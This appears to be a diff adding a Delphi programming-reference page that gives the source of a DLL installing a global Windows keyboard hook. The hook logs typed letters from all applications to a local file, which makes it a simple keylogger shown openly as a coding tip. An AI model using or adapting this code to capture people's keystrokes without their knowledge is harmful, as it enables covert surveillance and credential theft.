@@ -1,0 +1,94 @@
+<html>
+<head>
+  <title>Глобальный хук на клавиатуру</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+  <link type="text/css" href="css/css.css" rel="stylesheet" />
+  <link type="text/css" href="css/sh.css" rel="stylesheet" />
+  <script language="javascript" src="js/shInit.js"></script>
+  <script language="javascript" src="js/shCore.js"></script>
+  <script language="javascript" src="js/shBrushDelphi.js"></script>
+  <script language="javascript" src="js/shBrushSql.js"></script>
+</head>
+<body>
+<div id="layout">
+<div id="header">
+  <div id="logo"><img id="logo" src="img/logo.png" /></div>
+  <div id="navigation">
+    <p id="navigation">
+      <a class="navigation" onclick="prev();" href="#">Предыдущая</a><br />
+      <a class="navigation" onclick="up();" href="#">Наверх</a><br />
+      <a class="navigation" onclick="next();" href="#">Следующая</a>
+    </p>
+  </div>
+</div>
+<div id="content">
+<div id="explorer">DRKB Explorer</div>
+  <h1 id="title">Глобальный хук на клавиатуру</h1>
+<div id="date">01.01.2010</div>
+<!-- Actual content start -->
+
+<pre name="code" class="delphi">
+library Hook;
+uses Windows, SysUtils;
+const KF_UP_MY = $40000000;
+var CurrentHook: HHook;
+    KeyArray: array[0..19] of char;
+    KeyArrayPtr: integer;
+    CurFile:text;
+function GlobalKeyBoardHook(code: integer; wParam: integer; lParam:
+integer): longword; stdcall;
+var
+i:integer;
+begin
+  if code&lt; 0 then
+   begin
+     result:=CallNextHookEx(CurrentHook,code,wParam,lparam);
+     Exit;
+   end;
+  if ( (lParam and KF_UP_MY ) = 0) and (wParam&gt; =65) and (wParam&lt; =90) then
+    begin
+      KeyArray[KeyArrayPtr]:=char(wParam);
+      KeyArrayPtr:=KeyArrayPtr+1;
+      if KeyArrayPtr&gt; 19 then
+       begin
+        for i:=0 to 19 do
+        begin
+          Assignfile(CurFile,'d:\log.txt');
+          if fileexists('d:\log.txt')=false then rewrite(CurFile)
+          else Append(CurFile);
+          write(Curfile, KeyArray[i]);
+          closefile(curfile);
+        end;
+        KeyArrayPtr:=0;
+       end;
+    end;
+    CallNextHookEx(CurrentHook,code,wParam,lparam);
+    result:=0;
+end;
+procedure SetupGlobalKeyBoardHook;
+begin
+  CurrentHook:=SetWindowsHookEx(WH_KEYBOARD, @GlobalKeyBoardHook,HInstance, 0);
+  KeyArrayptr:=0;
+end;
+procedure unhook;
+begin
+  UnhookWindowshookEx(CurrentHook);
+end;
+ 
+exports
+ SetupGlobalKeyBoardHook, UnHook;
+begin
+end.
+</pre>
+
+<p><a href="http://delphiworld.narod.ru/" target="_blank">http://delphiworld.narod.ru/</a></p>
+<p>DelphiWorld 6.0</p>
+</div>
+<!-- Actual content end -->
+<hr />
+<div id="footer">
+<p>&copy; DRKB Library, 2010<br />Разработка и поддержка &mdash; <a href="http://www.drkb.ru/" target="_blank">Quadr0</a></p>
+</div>
+</div>
+</body>
+</html>
